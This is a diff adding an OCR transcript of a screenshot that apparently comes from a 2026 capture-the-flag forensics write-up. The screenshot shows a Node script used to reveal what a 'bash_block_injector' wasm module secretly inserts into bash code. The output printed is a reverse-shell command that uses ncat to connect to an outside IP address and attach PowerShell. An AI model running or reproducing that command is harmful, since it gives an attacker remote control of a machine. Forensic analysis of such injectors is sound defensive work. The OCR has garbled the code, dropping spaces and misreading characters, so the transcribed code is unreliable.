@@ -1,0 +1,19 @@
+# OCR: 2602.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/2602.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:40
+
+zaoqiwang@zaoqiwang:/clau
+CopperKoi@flag:~/forensic
+(base)(CopperKoiflag)-[~/forensic] $ls
+bash_block_injector_bg.wasm
+bash_block_injector.js
+(base)(CopperKoiflag)-[~/forensic] $ vim j.js
+(base)(CopperKoiflag)-[~/forensic]-$ node j.js
+ncat.exe 156.238.239.253 1314 -e powershel1
+(base)(CopperKoiflag)-[~/forensic] $ cat j.js
+const {inject_bash_blocks } = require('./bash_block_injector.js'); const input = "*.'bash\necho 1\n'"
+constseen=newSet(input.split(hln"));
+for(constlineofinject_bash_blocks(input).split("\n")){
+if(!seen.has(line))console.log(iine);（base)(CopperKoiflag)-[~/forensic]
++
